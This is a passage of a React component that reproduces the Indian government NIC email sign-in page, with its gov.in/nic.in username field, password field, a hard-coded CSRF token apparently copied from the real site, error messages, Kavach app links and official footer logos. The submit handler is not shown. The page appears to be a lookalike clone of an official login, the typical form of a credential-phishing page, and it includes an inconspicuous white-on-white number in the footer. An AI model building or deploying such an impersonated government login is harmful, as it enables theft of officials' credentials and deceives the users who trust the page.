                <path className="st4" d="M63,45.5l-0.2,0.1L63,45.5z" />
                <path
                  className="st4"
                  d="M69.1,40.5c-0.1,0.1-0.1,0.1-0.2,0.2C69,40.6,69.1,40.5,69.1,40.5"
                />
                <path
                  className="st4"
                  d="M73.5,36.2c-0.1,0.1-0.1,0.1-0.2,0.2C73.3,36.3,73.4,36.2,73.5,36.2"
                />
                <path className="st4" d="M73.8,35.7l-0.2,0.2L73.8,35.7z" />
                <path className="st4" d="M74.2,35.4L74,35.6L74.2,35.4z" />
                <path className="st4" d="M75.6,33.6l0.2-0.2L75.6,33.6z" />
                <path
                  className="st5"
                  d="M73.3,36.3c0,0.1-0.1,0.2-0.2,0.2C73,36.6,73.2,36.4,73.3,36.3"
                />
                <path className="st5" d="M63.4,45.2L63,45.5L63.4,45.2z" />
                <path className="st5" d="M73.6,35.9l-0.2,0.2L73.6,35.9z" />
                <path
                  className="st5"
                  d="M72.9,36.8c-0.1,0.1-0.2,0.2-0.2,0.2C72.7,36.9,72.8,36.8,72.9,36.8"
                />
                <path className="st5" d="M64.7,44.2l-0.4,0.3L64.7,44.2z" />
                <path className="st5" d="M74,35.6l-0.1,0.2L74,35.6z" />
                <path className="st5" d="M64,44.7L63.7,45L64,44.7z" />
                <path className="st5" d="M62.2,46l0.6-0.4L62.2,46z" />
                <path className="st5" d="M74.3,35.2l-0.1,0.1L74.3,35.2z" />
                <path className="st5" d="M70.5,39.2l-0.3,0.3L70.5,39.2z" />
                <path
                  className="st5"
                  d="M69.5,40.1c-0.1,0.1-0.2,0.2-0.3,0.3C69.3,40.4,69.4,40.3,69.5,40.1"
                />
                <path
                  className="st5"
                  d="M71,38.7c-0.1,0.1-0.2,0.2-0.3,0.3C70.8,38.9,70.9,38.8,71,38.7"
                />
                <path className="st5" d="M67.9,41.6l-1.2,1L67.9,41.6z" />
                <path className="st5" d="M68.4,41.1L68,41.5L68.4,41.1z" />
                <path
                  className="st5"
                  d="M72.5,37.2c-0.1,0.1-0.2,0.2-0.3,0.3C72.1,37.6,72.4,37.3,72.5,37.2"
                />
                <path className="st5" d="M68.9,40.6L68.6,41L68.9,40.6z" />
                <path className="st5" d="M70.1,39.7L69.7,40L70.1,39.7z" />
                <path className="st5" d="M72.1,37.6L71.6,38L72.1,37.6z" />
                <path className="st5" d="M65.3,43.8L64.9,44L65.3,43.8z" />
                <path className="st5" d="M66.5,42.8l-0.4,0.3L66.5,42.8z" />
                <path className="st5" d="M65.9,43.3l-0.4,0.3L65.9,43.3z" />
                <path
                  className="st5"
                  d="M71.6,38.1c-0.2,0.1-0.3,0.3-0.4,0.4L71.6,38.1z"
                />
                <path
                  className="st5"
                  d="M75,28.3l-0.3-1.2c-2,6.6-6.9,13.4-12.5,18.9l2.3-2.2L62.2,46l1.9-1.4l1.2-0.9c1.1-0.8,2.1-1.7,3.1-2.6
                c0.6-0.5,1.2-1,1.7-1.6c0.6-0.5,1-0.9,1.4-1.4c0.8-0.8,1.6-1.7,2.3-2.5c0.7-0.7,1.3-1.4,1.9-2.2C75.7,31.7,75.4,30,75,28.3"
                />
                <path
                  className="st1"
                  d="M44,72.4l1-0.1c-0.8-2-3.8-9.6-4.2-10.5c-2.8,0.2-5.6-0.1-8.4-0.9c-0.2,0,0.1,0,0,0C40.2,63.9,43,70.7,44,72.4
                "
                />
                <path
                  className="st1"
                  d="M44,10l-1.1,4.8c0.2,0.2,0.4,0.4,0.6,0.6l5.3-3.8C47.3,10.9,45.7,10.4,44,10"
                />
              </g>
            </svg>
          </div>
          <p>
            Enter Details to <strong>Sign In</strong>
          </p>

          <div className="form_action">
            <form
              method="post"
              name="loginForm"
              accept-charset="UTF-8"
              //   onSubmit={handleSubmit}
            >
              <input type="hidden" name="loginOp" value="login" />
              <input
                type="hidden"
                name="login_csrf"
                value="b75a5b19-45bb-4141-8af0-18e063866f6b"
              />
              <div id="errorMessageDiv" className="mainErrorMessage">
                <div
                  id="errorDivEmptyUsernamePassword"
                  className="errorMessage"
                >
                  <table>
                    <tr>
                      <td>
                        <img
                          src={critical}
                          title="Error"
                          alt="Error"
                          id="ZLoginErrorIcon"
                        />
                      </td>
                      <td>Username and Password cannot be empty</td>
                    </tr>
                  </table>
                </div>
                <div id="errorDivEmptyUsername" className="errorMessage">
                  <table>
                    <tr>
                      <td>
                        <img
                          src={critical}
                          title="Error"
                          alt="Error"
                          id="ZLoginErrorIcon"
                        />
                      </td>
                      <td>Username cannot be empty</td>
                    </tr>
                  </table>
                </div>
                <div id="errorDivEmptyPassword" className="errorMessage">
                  <table>
                    <tr>
                      <td>
                        <img
                          src={critical}
                          title="Error"
                          alt="Error"
                          id="ZLoginErrorIcon"
                        />
                      </td>
                      <td>Password cannot be empty</td>
                    </tr>
                  </table>
                </div>
                <div
                  id="errorDivEnterFullEmailAddress"
                  className="errorMessage"
                >
                  <table>
                    <tr>
                      <td>
                        <img
                          src={critical}
                          title="Error"
                          alt="Error"
                          id="ZLoginErrorIcon"
                        />
                      </td>
                      <td>Enter full email address</td>
                    </tr>
                  </table>
                </div>
              </div>

              {/* 
          <!-- <form> --> */}
              <input
                id="username"
                autocomplete="OFF"
                placeholder="Enter email user@gov.in / user@nic.in"
                className="zLoginField"
                name="username"
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                size="40"
                maxlength="1024"
                autocapitalize="off"
                autocorrect="off"
              />
              <input
                id="password"
                placeholder="**********"
                autocomplete="off"
                className="zLoginField"
                name="password"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                size="40"
                maxlength="1024"
              />

              <input
                id="remember"
                value="1"
                type="checkbox"
                name="zrememberme"
                style={{ display: "none" }}
              />
              <label for="remember" style={{ display: "none" }}>
                Stay signed in
              </label>
              <table>
                <tr>
                  <td style={{ width: "35%" }}>
                    <button
                      type="submit"
                      id="formSubmitButton"
                      className="submitButton"
                      onClick={handleSubmit}
                      value="Sign In"
                    >
                      <div
                        id="submitLoader"
                        style={{
                          float: "left",
                          marginRight: "5px",
                          display: "none",
                        }}
                      >
                        <div className="loader"></div>
                      </div>
                      <div style={{ float: "right" }}>Sign In</div>
                    </button>
                  </td>
                  <td>
                    <div className="user_links">
                      <a
                        href="https://passapp.email.gov.in/passapp/"
                        target="_blank"
                      >
                        Forgot Password
                      </a>
                      <a
                        href="https://passapp.email.gov.in/passapp/"
                        target="_blank"
                      >
                        Change Password
                      </a>
                      <a
                        href="https://passapp.email.gov.in/passapp/"
                        target="_blank"
                      >
                        Activate ID
                      </a>
                    </div>
                  </td>
                </tr>
              </table>

              <div className="tip-block effect2">
                <span className="close-tip"></span>
                <h3>
                  <i></i> Tip of the day
                </h3>
                <div className="tip-content">
                  <div className="tip-slider">
                    <div>
                      <p className="topic"></p>
                      <a
                        href="https://infosecawareness.in/nic-tip"
                        target="_blank"
                      >
                        <img
                          id="tipOfDayImg"
                          style={{ width: "192px", height: "192px" }}
                          src="../infosecawareness.in/tipofday.png"
                          alt=""
                        />
                      </a>
                    </div>
                  </div>
                </div>
              </div>

              <div className="kavach-download">
                <span>Download Kavach</span>
                <a href="https://apps.apple.com/in/app/kavach-authentication/id1227301621">
                  <img src={appstore} alt="App store" />
                </a>
                <a href="https://play.google.com/store/apps/details?id=com.gov.in&amp;hl=en_IN&amp;gl=US">
                  <img src={playstore} alt="Google Play store" />
                </a>
                <a href="https://kavach.mail.gov.in/">
                  <img src={kavach} alt="Nic" />
                </a>
              </div>
              <div className="kavach-desclaimer">
                Kavach App should be downloaded only from authentic platforms
                i.e. App Store, Google Play Store &
                <a href="https://kavach.mail.gov.in/">
                  https://kavach.mail.gov.in
                </a>
              </div>

              <div className="kavach-info">
                <a href="https://parichay.nic.in/Accounts/Services?service=eformsretired">
                  <h3>
                    Extend ID <br />
                    (Retired Officers)
                  </h3>
                </a>
                <a
                  className="update_mobile"
                  href="https://eforms.nic.in/update-mobile"
                  target="_blank"
                >
                  Update Mobile & <br /> Profile <small>New</small>
                </a>
                <div className="lang-block">
                  Language:
                  <select
                    className="version"
                    id="language"
                    name="language"
                    onchange="selectLang(this.options[this.selectedIndex].value)"
                  >
                    <option value="English">English</option>
                    <option value="Hindi">Hindi - हिंदी</option>
                    <option value="Tamil">Tamil - தமிழ்</option>
                  </select>
                </div>
                <div className="lang-block">
                  Version:
                  <select
                    className="version"
                    id="client"
                    name="client"
                    onchange="clientChange(this.options[this.selectedIndex].value)"
                  >
                    <option value="preferred"> Default</option>
                    <option value="advanced"> Advanced (Ajax)</option>
                    <option value="standard" selected>
                      Standard (HTML)
                    </option>
                    <option value="mobile"> Mobile</option>
                  </select>
                </div>
              </div>
            </form>
          </div>
          <div
            id="ZLoginWhatsThis"
            className="ZLoginInfoMessage"
            style={{ display: "none" }}
            onclick={showWhatsThis}
            role="tooltip"
          >
            <h3 style={{ textAlign: "center" }}>Client Types</h3>
            <b>Advanced</b> offers the full set of Web collaboration features.
            This Web Client works best with newer browsers and faster Internet
            connections. <br />
            <br />
            <b>Standard</b> is recommended when Internet connections are slow,
            when using older browsers, or for easier accessibility. <br />
            <br />
            <b>Mobile</b> is recommended for mobile devices. <br />
            <br />
            To set <b>Default</b> to be your preferred client type, change the
            sign in options in your Preferences, General tab after you sign in.
          </div>
          <div className="nic_links">
            <div className="niclogo">
              <a href="https://www.nic.in/" target="_blank">
                <img
                  src={niclogo}
                  className="login-logo"
                  alt="NationalInformatics Centre"
                />
              </a>
            </div>

            <div className="login-logo-title-inside">
              <a href="https://meity.gov.in/" target="_blank">
                <img
                  src="img/nic/miety.png"
                  className="meity-logo"
                  alt=" Ministry of Electronics &amp; Information Technology Government of India"
                />
              </a>
            </div>

            <div className="social_links">
              <a
                className="fb"
                href="https://facebook.com/NICIndia"
                target="_blank"
              >
                <img src="assets/img/nic/facebook-icon.svg" alt="" />
              </a>
              <a href="https://twitter.com/NICMeity" target="_blank">
                <img src="assets/img/nic/twitter-icon.svg" alt="" />
              </a>
              <a
                href="https://www.linkedin.com/company/national-informatics-centre/"
                target="_blank"
              >
                <img src="assets/img/nic/linkdin-icon.svg" alt="" />
              </a>
            </div>
          </div>
        </div>

        <div className="block-wraper">
          <div className="banner">
            <span className="close-banner">close Banner</span>
            <a href="https://amritmahotsav.nic.in/">
              <img src={nationalsalebrates} alt="" />
            </a>
          </div>
        </div>
      </div>
      <div className="footer">
        <div className="internet-block">
          <strong> For Intranet access</strong>
          <span>
            <a href="https://intranic.nic.in/">INTRANIC</a>
          </span>
          <span>
            <a href="https://inoc.nic.in/" target="_blank">
              NIC INOC
            </a>
          </span>
          <span>
            <a href="https://ossrepository.gov.in/" target="_blank">
              NIC OTG
            </a>
          </span>
        </div>
        <div className="dindia">
          <a href="https://digitalindia.gov.in/" target="_blank">
            <img
              src="assets/img/nic/digital-india-flogo.png"
              alt="Digital India"
            />
          </a>
          <p
            onMouseOver="this.style.color='green'"
            onMouseOut="this.style.color='white'"
            style={{
              color: "white",
              float: "right",
              fontSize: "10px",
              paddingRight: "10px",
            }}
          >
            129
          </p>
        </div>
        <div className="footer-logo">
          <a href="https://egreetings.gov.in/" target="_blank">
            <img src="assets/img/nic/egreeting.png" alt="eGreetings" />
          </a>
          <a href="https://nkn.gov.in/" target="_blank">
            <img src="assets/img/nic/nkn.png" alt="NKN" />
          </a>

          <a href="https://sampark.gov.in/" target="_blank">
            <img src="assets/img/nic/sampark.png" alt="E Sampark" />
          </a>
          <a href="https://gem.gov.in/" target="_blank">
            <img src="assets/img/nic/GEM.png" alt="Gem Gov" />
          </a>
          <a href="https://eprocure.gov.in/" target="_blank">
            <img src="assets/img/nic/gePNIC.png" alt="E Procure" />
          </a>
          <a href="https://www.mygov.in/" target="_blank">
            <img src="assets/img/nic/mygov1.png" alt="MyGov" />
          </a>
          <a href="https://www.getyourown.in/" target="_blank">
            <img src="assets/img/nic/in.png" alt="Get Your Own" />
          </a>
          <a href="https://esamiksha.gov.in/" target="_blank">
            <img src="assets/img/nic/samiksha.png" alt="E Samiksha" />
          </a>
          <a href="https://esuvidha.gov.in/" target="_blank">
            <img src="assets/img/nic/suvidha.png" alt="E Suvidha" />
          </a>
          <a href="https://www.india.gov.in/" target="_blank">
            <img src="assets/img/nic/india-gov-in.png" alt="India Gov" />
          </a>
          <a href="https://data.gov.in/" target="_blank">
            <img src="assets/img/nic/data-gov-in.png" alt="Data Gov" />
          </a>
        </div>
      </div>
    </div>
  );
};

export default Home;
